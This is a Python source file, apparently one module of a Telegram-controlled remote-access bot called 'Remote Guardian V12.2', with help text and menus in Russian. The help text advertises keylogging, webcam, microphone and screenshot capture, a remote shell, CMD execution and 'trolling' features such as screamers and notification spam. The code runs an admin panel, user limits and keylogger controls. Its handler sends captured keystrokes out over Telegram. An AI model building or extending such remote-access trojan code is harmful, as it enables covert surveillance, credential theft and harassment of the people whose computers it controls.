from telethon import events, Button
from core.decorators import with_verify
from core.state import state
import database
from config import MAIN_ADMINS

def register_menus(bot):
    @bot.on(events.NewMessage(pattern=r'^/help$'))
    @with_verify("Help", dangerous=False)
    async def help_command(event):
        help_text = """
📚 **REMOTE GUARDIAN V12.2 - СПРАВКА**

━━━━━━━━━━━━━━━━━━━━━━━
🎯 **ОСНОВНЫЕ**
━━━━━━━━━━━━━━━━━━━━━━━
/menu — главное меню
/help — эта справка

━━━━━━━━━━━━━━━━━━━━━━━
🖥 **СИСТЕМА**
━━━━━━━━━━━━━━━━━━━━━━━
/dashboard — системный дашборд 🔥
/dash — компактный дашборд
/dashboard auto — авто-обновление
/sysinfo — инфо о системе
/ps — список процессов
/kill <PID> — убить процесс
/temp — температуры
/disk — использование дисков
/cmd <команда> — выполнить CMD
/clipboard — буфер обмена

━━━━━━━━━━━━━━━━━━━━━━━
🔔 **УМНЫЕ УВЕДОМЛЕНИЯ** 🆕
━━━━━━━━━━━━━━━━━━━━━━━
/triggers — настройка алертов
/triggers on/off <имя> — вкл/выкл

**Автоматические алерты:**
• 🔥 Высокий CPU (>90%)
• 🌡️ Высокая температура (>85°C)
• 💾 Мало места (<10%)
• 🔌 USB подключен/отключен
• 🌐 Смена IP адреса

━━━━━━━━━━━━━━━━━━━━━━━
⚡ **УПРАВЛЕНИЕ**
━━━━━━━━━━━━━━━━━━━━━━━
/shutdown — выключить
/restart — перезагрузить
/lock — заблокировать
/sleep — режим сна
/autorun on/off — автозагрузка

━━━━━━━━━━━━━━━━━━━━━━━
👁 **НАБЛЮДЕНИЕ**
━━━━━━━━━━━━━━━━━━━━━━━
📸 Скриншот (кнопка)
🎥 Веб-камера (кнопка)
/mic [сек] — запись микрофона
/keylog on/off/get — кейлоггер

━━━━━━━━━━━━━━━━━━━━━━━
🎭 **КИБЕР**
━━━━━━━━━━━━━━━━━━━━━━━
/say <текст> — озвучка TTS
/vol <0-100> — громкость
/mute — выключить звук
/open <URL> — открыть ссылку

━━━━━━━━━━━━━━━━━━━━━━━
⌨️ **ВВОД**
━━━━━━━━━━━━━━━━━━━━━━━
/type <текст> — быстрая вставка
/typeto <текст> — умная вставка

━━━━━━━━━━━━━━━━━━━━━━━
📁 **ФАЙЛЫ**
━━━━━━━━━━━━━━━━━━━━━━━
/fm [путь] — файл-менеджер
/wallpaper — установить обои

━━━━━━━━━━━━━━━━━━━━━━━
🎬 **МЕДИА**
━━━━━━━━━━━━━━━━━━━━━━━
/getmedia <URL> — YouTube
/media — медиатека
/play — воспроизвести

━━━━━━━━━━━━━━━━━━━━━━━
🌐 **СЕТЬ**
━━━━━━━━━━━━━━━━━━━━━━━
/speedtest — тест скорости
/myip — внешний IP
/netstat — подключения

━━━━━━━━━━━━━━━━━━━━━━━
🪟 **ОКНА**
━━━━━━━━━━━━━━━━━━━━━━━
/windows — список окон
/close <название> — закрыть

━━━━━━━━━━━━━━━━━━━━━━━
⏰ **ПЛАНИРОВЩИК**
━━━━━━━━━━━━━━━━━━━━━━━
/schedule HH:MM <команда>
/tasks — список задач
/cancel <ID> — отменить

━━━━━━━━━━━━━━━━━━━━━━━
🖥 **VNC & SHELL**
━━━━━━━━━━━━━━━━━━━━━━━
/vnc start/stop — стриминг
/shell — терминал

━━━━━━━━━━━━━━━━━━━━━━━
🎮 **ТРОЛИНГ**
━━━━━━━━━━━━━━━━━━━━━━━
/flip — перевернуть экран
/shake [сек] — трясти курсор
/glitch [сек] — артефакты
/rickroll — Rick Astley 🕺
/crazy — безумный режим
/spam [текст] — спам уведомлений
/matrix — эффект матрицы

━━━━━━━━━━━━━━━━━━━━━━━
🤖 **AI (Google Gemini)**
━━━━━━━━━━━━━━━━━━━━━━━
/ask <вопрос> — спросить AI
/analyze — анализ скриншота

━━━━━━━━━━━━━━━━━━━━━━━
👑 **АДМИН**
━━━━━━━━━━━━━━━━━━━━━━━
/users — список пользователей
/adduser <ID> <лимит>
/deluser <ID>
/ban <ID> / /unban <ID>
        """
        await event.reply(help_text)

    @bot.on(events.NewMessage(pattern=r'^(/start|/menu|🔙 Назад в меню)$'))
    @with_verify("Open Main Menu", dangerous=False)
    async def main_menu(event):
        kb = [
            [Button.text("📊 Дашборд"), Button.text("⚙️ Процессы")],
            [Button.text("📸 Скриншот"), Button.text("🎥 Веб-камера")],
            [Button.text("📋 Буфер обмена"), Button.text("📂 Файлы (Диск C)")],
            [Button.text("🎬 Медиатека"), Button.text("🔽 Загрузить медиа")]
        ]
        if str(event.sender_id) in MAIN_ADMINS:
            kb.append([Button.text("👑 Админ Панель")])
        await event.reply("🎛 **Терминал управления:**", buttons=kb)

    @bot.on(events.NewMessage(func=lambda e: e.text == '👑 Админ Панель'))
    @with_verify("Admin Panel", dangerous=True)
    async def admin_panel(event):
        if str(event.sender_id) not in MAIN_ADMINS:
            return await event.reply("⛔️ Нет доступа.")
        kb = [
            [Button.text("🔴 Выключить"), Button.text("🔄 Рестарт")],
            [Button.text("🔒 Заблокировать ПК"), Button.text("🖥 Потушить экран")],
            [Button.text("🚫 Блок мыши (10 сек)"), Button.text("🎤 Запись (10 сек)")],
            [Button.text("🛡️ Режим охраны"), Button.text("⌨️ Кейлоггер")],
            [Button.text("🔊 Сирена"), Button.text("👻 Скример")],
            [Button.text("👥 Пользователи"), Button.text("🔔 Триггеры")],
            [Button.text("🔙 Назад в меню")]
        ]
        await event.reply("👑 **Админ-Панель:**", buttons=kb)

    @bot.on(events.NewMessage(func=lambda e: e.text == '👥 Пользователи'))
    @with_verify("List Users", dangerous=True)
    async def list_users(event):
        if str(event.sender_id) not in MAIN_ADMINS:
            return await event.reply("⛔️ Нет доступа.")
        db = database.data
        if not db:
            return await event.reply("📭 База данных пуста.")
        text = "👥 **Пользователи:**\n\n"
        for uid, data in db.items():
            role_icon = {"owner": "👑", "admin": "🛡", "user": "👤"}.get(data['role'], "❓")
            used = data.get('used_today', 0)
            lim = data.get('limit', 99999)
            text += f"{role_icon} `{uid}` ({data['role']})\n   └ {used}/{lim} команд сегодня\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(func=lambda e: e.text == '🛡️ Режим охраны'))
    @with_verify("Toggle Security Mode", dangerous=True)
    async def toggle_security(event):
        state.security_mode = not state.security_mode
        status = "ВКЛЮЧЕН 🔴" if state.security_mode else "ВЫКЛЮЧЕН 🟢"
        await event.reply(f"🛡️ **Режим охраны:** {status}")
    
    @bot.on(events.NewMessage(func=lambda e: e.text == '⌨️ Кейлоггер'))
    @with_verify("Toggle Keylogger Menu", dangerous=True)
    async def keylogger_menu(event):
        status = "🟢 АКТИВЕН" if state.keylog_active else "🔴 НЕАКТИВЕН"
        
        kb = [
            [Button.text("▶️ Включить"), Button.text("⏸️ Выключить")],
            [Button.text("📋 Получить лог"), Button.text("🗑️ Очистить")],
            [Button.text("🔙 Назад в меню")]
        ]
        
        await event.reply(
            f"⌨️ **КЕЙЛОГГЕР**\n\n"
            f"**Статус:** {status}\n"
            f"**Буфер:** {len(state.keylog_buffer)} символов\n"
            f"**Макс:** 10000 символов",
            buttons=kb
        )
    
    @bot.on(events.NewMessage(func=lambda e: e.text == '▶️ Включить'))
    @with_verify("Start Keylogger", dangerous=True)
    async def start_keylogger_btn(event):
        from handlers.system import toggle_keylogger_state
        await toggle_keylogger_state(event.reply)
    
    @bot.on(events.NewMessage(func=lambda e: e.text == '⏸️ Выключить'))
    @with_verify("Stop Keylogger", dangerous=True)
    async def stop_keylogger_btn(event):
        from handlers.system import toggle_keylogger_state
        await toggle_keylogger_state(event.reply)
    
    @bot.on(events.NewMessage(func=lambda e: e.text == '📋 Получить лог'))
    @with_verify("Get Keylog", dangerous=True)
    async def get_keylog_btn(event):
        import os
        from config import BASE_DIR
        from utils.helpers import safe_remove
        
        with state.keylog_lock:
            if not state.keylog_buffer:
                return await event.reply("📭 Буфер кейлоггера пуст.")
            text = ''.join(state.keylog_buffer)
            state.keylog_buffer.clear()
        
        if len(text) > 3000:
            fp = os.path.join(BASE_DIR, 'keylog.txt')
            with open(fp, 'w', encoding='utf-8') as f:
                f.write(text)
            await event.reply("⌨️ Лог нажатий:", file=fp)
            safe_remove(fp)
        else:
            await event.reply(f"⌨️ **Лог нажатий:**\n`{text}`")
    
    @bot.on(events.NewMessage(func=lambda e: e.text == '🗑️ Очистить'))
    @with_verify("Clear Keylog", dangerous=True)
    async def clear_keylog_btn(event):
        with state.keylog_lock:
            state.keylog_buffer.clear()
        await event.reply("🗑️ Буфер кейлоггера очищен.")
    
    @bot.on(events.NewMessage(func=lambda e: e.text == '🔔 Триггеры'))
    @with_verify("Open Triggers Menu", dangerous=False)
    async def triggers_menu_btn(event):
        from utils.triggers import get_trigger_status, TRIGGERS
        from handlers.triggers import TRIGGER_NAMES
        
        status = get_trigger_status()
        
        message = "🔔 **УМНЫЕ УВЕДОМЛЕНИЯ**\n\n"
        
        enabled_count = sum(1 for v in status.values() if v)
        total_count = len(status)
        
        message += f"**Активно:** {enabled_count}/{total_count}\n\n"
        
        for trigger_name, enabled in status.items():
            icon = "✅" if enabled else "❌"
            label = TRIGGER_NAMES.get(trigger_name, trigger_name)
            message += f"{icon} {label}\n"
        
        buttons = [
            [Button.text("⚙️ Настроить"), Button.text("📊 Статистика")],
            [Button.text("🔙 Назад в меню")]
        ]
        
        await event.reply(message, buttons=buttons)
    
    @bot.on(events.NewMessage(func=lambda e: e.text == '⚙️ Настроить'))
    @with_verify("Configure Triggers", dangerous=False)
    async def configure_triggers_btn(event):
        # Открываем полноценное меню триггеров
        await event.reply(
            "⚙️ Используй команду `/triggers` для полной настройки триггеров\n\n"
            "Или быстрые команды:\n"
            "`/triggers on high_cpu` - включить\n"
            "`/triggers off high_cpu` - выключить"
        )
